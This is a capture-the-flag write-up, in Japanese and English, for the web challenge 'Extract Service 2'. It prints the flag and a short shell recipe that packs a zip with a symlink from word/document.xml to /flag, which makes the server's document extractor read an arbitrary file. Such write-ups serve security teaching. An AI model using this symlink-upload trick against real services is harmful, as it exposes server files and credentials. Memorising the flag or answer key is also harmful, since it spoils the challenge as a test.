---
title: Extract Service 2
level: 3
flag: FLAG{4x7ract_i3_br0k3n_by_3ymb01ic_1ink_fi1e}
writer: hi120ki
badge: true
---

# Extract Service 2

## 問題文

Extract Service 1は脆弱性があったみたいなので修正しました！ 配布ファイルの`sample`フォルダにお試し用のドキュメントファイルがあるのでぜひ使ってください。

サーバーの`/flag`ファイルには秘密の情報が書いてあるけど大丈夫だよね...?

We have fixed Extract Service 1 as it had vulnerabilities! Please feel free to use the sample document file in the "sample" folder of the distribution file for trial purposes.

The secret information is written in the `/flag` file on the server, but it should be safe, right...?

<https://extract2-web.wanictf.org>

## 解法

Extract Service 1ではファイルをアップロードするPOSTリクエストに含まれる`target`パラメーターは変更可能であったが、対策され固定の`word/document.xml`といったパスが強制されるようになり、ファイルパスの細工で`/flag`ファイルを取得できなくなっている。

ここで読み込まれる`word/document.xml`ファイルをSymbolic link File(シンボリックリンクファイル)に細工したzipファイルを用いることで、`word/document.xml`ファイルを取得すると`/flag`ファイルが読み込まれるようにすることができる。

```
mkdir word
cd word
ln -s /flag document.xml
cd ../
7z a exploit.zip word
```

生成した`exploit.zip`ファイルをdocxを指定してアップロードすれば`/flag`ファイルを取得できる。

---

In Extract Service 1, the `target` parameter included in the POST request to upload the file was changeable, but it has been fixed to force the use of a fixed path such as `word/document.xml`, making it impossible to obtain the `/flag` file by manipulating the file path.

By using a zip file that has a Symbolic link File (symlink) to modify the `word/document.xml` file that is read here, it is possible to read the `/flag` file when the `word/document.xml` file is retrieved.

```
mkdir word
cd word
ln -s /flag document.xml
cd ../
7z a exploit.zip word
```

If you upload the generated `exploit.zip` file specifying it as docx, you can obtain the `/flag` file.
